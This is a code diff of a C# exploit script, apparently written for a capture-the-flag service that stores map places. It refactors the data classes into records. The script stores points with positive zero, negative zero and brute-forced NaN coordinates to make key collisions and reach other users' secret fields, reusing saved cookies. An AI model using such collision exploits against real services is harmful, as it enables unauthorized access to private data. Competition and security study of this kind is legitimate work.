@@ -16,6 +16,7 @@ State state;
 HttpClient cookieClient;
 CookieContainer cookies;
 
+// Using state for NaN places and other stuff, so no need to brute force values each round
 await using var stateStream = new FileStream("state.json", FileMode.OpenOrCreate, FileAccess.ReadWrite, FileShare.Read);
 if(stateStream.Length > 0)
     state = (await JsonSerializer.DeserializeAsync<State>(stateStream, jsonOptions))!;
@@ -50,11 +51,11 @@ else
     cookieClient = new HttpClient(new HttpClientHandler { UseCookies = true, CookieContainer = cookies }) { BaseAddress = baseUri };
 
     // Add positive zero point
-    var p1PositiveZero = await PutAndReadStringAsync(cookieClient, new Place {Lat = 0.1337, Long = 0.0, Public = "pwn", Secret = "pwn"});
+    var p1PositiveZero = await PutAndReadStringAsync(cookieClient, new Place(0.1337, 0.0, "pwn", "pwn"));
     await ColoredWriteLineAsync(Console.Error, " Positive zero [1]: " + p1PositiveZero, ConsoleColor.White);
 
     // Add negative zero point with the same other coord
-    var p2NegativeZero = await PutAndReadStringAsync(cookieClient, new Place {Lat = 0.1337, Long = -0.0, Public = "pwn", Secret = "pwn"});
+    var p2NegativeZero = await PutAndReadStringAsync(cookieClient, new Place(0.1337, -0.0, "pwn", "pwn"));
     await ColoredWriteLineAsync(Console.Error, " Negative zero [2]: " + p2NegativeZero, ConsoleColor.White);
 
     cookies = new CookieContainer();
@@ -64,21 +65,21 @@ else
     await ColoredWriteLineAsync(Console.Error, "Brute force NaN points...");
 
     // Add some random point to start brute force from
-    var point = await PutAndReadStringAsync(cookieClient, new Place {Lat = 0.1337, Long = 0.1337, Public = "pwn", Secret = "pwn"});
+    var point = await PutAndReadStringAsync(cookieClient, new Place(0.1337, 0.1337, "pwn", "pwn"));
     var (p5NanPoint, p4SomeOwnedPoint) = await BruteForceNanValueAsync(cookieClient, point);
 
     // Update non-existent random owned point in order to save it to the database
-    p4SomeOwnedPoint = await PutAndReadStringAsync(cookieClient, new PlaceInfoOnly { Public = "pwn", Secret = "pwn" }, p4SomeOwnedPoint);
+    p4SomeOwnedPoint = await PutAndReadStringAsync(cookieClient, new PlaceInfoOnly("pwn", "pwn"), p4SomeOwnedPoint);
     await ColoredWriteLineAsync(Console.Error, "  Random point [4]: " + p4SomeOwnedPoint, ConsoleColor.White);
 
     // Update non-existent NaN point in order to save it to the database
-    p5NanPoint = await PutAndReadStringAsync(cookieClient, new PlaceInfoOnly { Public = "pwn", Secret = "pwn" }, p5NanPoint);
+    p5NanPoint = await PutAndReadStringAsync(cookieClient, new PlaceInfoOnly("pwn", "pwn"), p5NanPoint);
     await ColoredWriteLineAsync(Console.Error, "     NaN point [5]: " + p5NanPoint, ConsoleColor.White);
 
     var p6NanPoint = p5NanPoint;
     await ColoredWriteLineAsync(Console.Error, "Same NaN point [6]: " + p6NanPoint, ConsoleColor.White);
 
-    state = new State { Cookie = max.Value, PositiveZero = p1PositiveZero, NegativeZero = p2NegativeZero, RndBeforeNan = p4SomeOwnedPoint, Nan = p5NanPoint };
+    state = new State(max.Value, p1PositiveZero, p2NegativeZero, p4SomeOwnedPoint, p5NanPoint);
     await JsonSerializer.SerializeAsync(stateStream, state, jsonOptions);
 }
 
@@ -154,25 +155,6 @@ async Task ColoredWriteLineAsync(TextWriter writer, string line, ConsoleColor co
     Console.ResetColor();
 }
 
-class State
-{
-    public string Cookie { get; set; }
-    public string PositiveZero { get; set; }
-    public string NegativeZero { get; set; }
-    public string RndBeforeNan { get; set; }
-    public string Nan { get; set; }
-}
-
-class Place
-{
-    public double Lat { get; set; }
-    public double Long { get; set; }
-    public string? Public { get; set; }
-    public string? Secret { get; set; }
-}
-
-class PlaceInfoOnly
-{
-    public string? Public { get; set; }
-    public string? Secret { get; set; }
-}
+record State(string Cookie, string PositiveZero, string NegativeZero, string RndBeforeNan, string Nan);
+record Place(double Lat, double Long, string? Public, string? Secret);
+record PlaceInfoOnly(string? Public, string? Secret);
